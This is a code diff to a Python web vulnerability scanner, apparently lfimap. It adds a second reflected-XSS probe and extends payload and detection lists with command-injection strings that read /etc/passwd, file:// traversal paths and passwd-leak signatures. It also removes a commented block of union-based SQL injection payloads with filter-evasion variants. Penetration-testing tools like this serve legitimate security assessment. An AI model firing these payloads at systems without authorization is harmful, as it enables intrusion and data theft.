@@ -120,6 +120,7 @@ def GET(url, headers, proxy, exploitType, exploitMethod, exploit = False):
 
     try:
         if(exploit):
+            stats["getRequests"] += 1
             res = requests.get(url, headers = headers, proxies = proxy, verify = False)
         else:
             stats["getRequests"] += 1
@@ -207,7 +208,8 @@ def addToExploits(req, request_type, exploit_type, getVal, postVal, headers, att
 def init(req, reqType, explType, getVal, postVal, headers, attackType, cmdInjectable = False):
 
     #Add them from the most complex one to the least complex. This is important.
-    TO_REPLACE = ["Windows/System32/drivers/etc/hosts", "cat%20/etc/passwd|head%20-n%201", 
+    TO_REPLACE = ["<IMG sRC=X onerror=jaVaScRipT:alert`xss`>", "aahgpz\"ptz>e<atzf", 
+                  "Windows/System32/drivers/etc/hosts", "cat%20/etc/passwd|head%20-n%201", 
                   "cat%20/etc/group|head%20-n%201", "cat%20%2F%2Fetc%2Fpasswd", 
                   "%windir%\System32\drivers\etc\hosts", "C:\Windows\System32\drivers\etc\hosts",
                   "file%3A%2F%2F%2Fetc%2Fpasswd%2500", "file%3A%2F%2F%2Fetc%2Fpasswd",
@@ -358,27 +360,30 @@ def test_xss(url):
     if(args.verbose):
         print("[i] Testing for XSS...")
     
-    xssTest = "<IMG sRC=X onerror=jaVaScRipT:alert`xss`>"
-    u = url.replace(args.param, xssTest)
-            
-    if(args.postreq): 
-        res, br = POST(u, headers, args.postreq.replace(args.param, xssTest), proxies, "XSS", "XSS")
-    else:
-        res, br = GET(u, headers, proxies, "XSS", "XSS") 
-            
-    if(xssTest in res.text):
-        stats["vulns"] += 1
-        if(args.postreq): print("[+] XSS -> '" + u + "' -> HTTP POST -> '" + args.postreq.replace(args.param, xssTest) + "'")
-        else: print("[+] Unsanitized reflection, possible XSS -> '" + u + "'")
+    xssTest = []
+    xssTest.append("<IMG sRC=X onerror=jaVaScRipT:alert`xss`>'")
+    xssTest.append("aahgpz\"ptz>e<atzf")
+
+    for test in xssTest:
+        u = url.replace(args.param, test)
+
+        if(args.postreq): 
+            res, br = POST(u, headers, args.postreq.replace(args.param, test), proxies, "XSS", "XSS")
+        else:
+            res, br = GET(u, headers, proxies, "XSS", "XSS") 
+
+        if(test in res.text):
+            print("    Value '" + test + "' is reflected.")
+
+            #stats["vulns"] += 1
+            #Check for headers that could potentially prevent XSS and let user know about them
+            if('Content-Security-Policy' in res.headers):
+                print("[i] CSP could prevent XSS and is set to: '" + res.headers['Content-Security-Policy'] + "'")
+            if('X-Content-Type-Options' in res.headers):
+                print("[i] X-Content-Type-Options could prevent XSS and is set to: '" + res.headers['X-Content-Type-Options'] + "'")
+            print("    Content-Type: " + res.headers['Content-Type']) 
         
-        #Check for headers that could potentially prevent XSS and let user know about them
-        if('Content-Security-Policy' in res.headers):
-            print("[i] CSP could prevent XSS and is set to: '" + res.headers['Content-Security-Policy'] + "'")
-        if('X-Content-Type-Options' in res.headers):
-            print("[i] X-Content-Type-Options could prevent XSS and is set to: '" + res.headers['X-Content-Type-Options'] + "'")
-        print("    Content-Type: " + res.headers['Content-Type']) 
-        
-        if(not br): return
+            if(not br): return
     return
 
 def test_filter(url):
@@ -651,54 +656,6 @@ def test_heuristics(url):
     return
 
 def test_sqli(url):
-   # global skipsqli
-   # if(skipsqli): return
-   # if(args.verbose):
-   #     print("[i] Testing with union-based SQL injection up to 15 columns...")
-    
-   # TODO make this better
-   # pyldList = []
-   # pyldList.append("1337 UNION ALL SELECT INJECT")
-   # pyldList.append("1337\" UNION ALL SELECT INJECT-- -")
-   # pyldList.append("1337' UNION ALL SELECT INJECT-- -")
-   # pyldList.append("1337' UNION ALL SELECT INJECT%23")
-   # pyldList.append("1337)' UNION ALL SELECT INJECT-- -")
-   # pyldList.append("1337)\" UNION ALL SELECT INJECT-- -")
-   # pyldList.append("1337 UNIUNIONON ALL SELSELECTECT INJECT--%23 -%23")
-   # pyldList.append("1337' UNIUNIONON ALL SELSELECTECT INJECT--%23 -%23")
-   # pyldList.append("1337)\" UNIUNIONON ALL SELSELECTECT INJECT%23-- -%23")
-   # pyldList.append("1337)' UNIUNIONON ALL SELSELECTECT INJECT%23-- -%23")
-   # pyldList.append("1337 UNIUNIONON ALL SELECT INJECT%23-- -%23")
-   # pyldList.append("1337' UNIUNIONON ALL SELECT INJECT%23-- -%23")
-   # pyldList.append("1337\" UNIUNIONON ALL SELECT INJECT%23-- -%23")
-   # pyldList.append("1337)\" UNIUNIONON ALL SELECT INJECT%23-- -%23")
-   # pyldList.append("1337 UNION ALL SELSELECTECT INJECT%23-- -%23")
-   # pyldList.append("1337' UNION ALL SELSELECTECT INJECT%23-- -%23")
-   # pyldList.append("1337\" UNION ALL SELSELECTECT INJECT%23-- -%23")
-   # pyldList.append("1337)\" UNION ALL SELSELECTECT INJECT%23-- -%23")
-    
-   # toInject = 'concat(0x6c66696d61702d696e6a65637465642d737472696e67)'
-   # for p in pyldList:
-   #     # Test up to 15 columns, this will generate a lot of requests. Careful not to flood the target with --sqli/-a options!!!
-   #     for i in range(15):
-   #         if(i == 0): 
-   #             pyld = p.replace("INJECT", toInject)
-   #             ltrInject = ',' + toInject
-   #         else: pyld = p.replace("INJECT", toInject + (ltrInject*i))
-   #         
-   #         if(args.postreq): req, br = POST(url, headers, args.postreq.replace(args.param,pyld), proxies, "SQLI", "SQLI")
-   #         else: req, br = GET(url.replace(args.param,pyld), headers, proxies, "SQLI", "SQLI")
-   #         
-   #         if("lfimap-injected-string" in req.text.lower()):
-   #             if(args.postreq): print("[+] SQLI with " + str(i+1) + " columns -> " + url + " HTTP POST -> " + args.postreq.replace(args.param,pyld))
-   #             else: print("[+] SQLI with " + str(i+1)+ " columns -> " + url.replace(args.param,pyld))
-   #             stats["vulns"] += 1
-   #             # If '--no-stop' is set, then union based sqli is stopped, because none of the following payloads will be valid
-   #             # because number of columns won't match. Break out of the loop, and test for blind sql injection.
-   #             if(not args.no_stop): return
-   #             else: break
-
-    #-----------------------------------------------------
     if(args.verbose):
         print("[i] Testing for blind SQL injection...")
     
@@ -782,8 +739,8 @@ def test_sqli(url):
 
 #Checks if sent payload is executed, if any of the below keywords are in the response, returns True
 def checkPayload(webResponse):
-    KEY_WORDS = ["root:x:0:0", "www-data:",
-                "cm9vdDp4OjA", "Ond3dy1kYX", "ebbg:k:0:0", "d3d3LWRhdG",
+    KEY_WORDS = ["root:x:0:0", "www-data:", "<IMG sRC=X onerror=jaVaScRipT:alert`xss`>",
+                "cm9vdDp4OjA", "Ond3dy1kYX", "ebbg:k:0:0", "d3d3LWRhdG", "aahgpz\"ptz>e<atzf",
                 "jjj-qngn:k", "daemon:x:1:", "r o o t : x : 0 : 0", "ZGFlbW9uOng6",
                 "; for 16-bit app support", "sample HOSTS file used by Microsoft",
                 "iBvIG8gdCA6IHggOiA", "OyBmb3IgMTYtYml0IGFwcCBzdXBw", "c2FtcGxlIEhPU1RTIGZpbGUgIHVzZWQgYnkgTWljcm9zb2", 
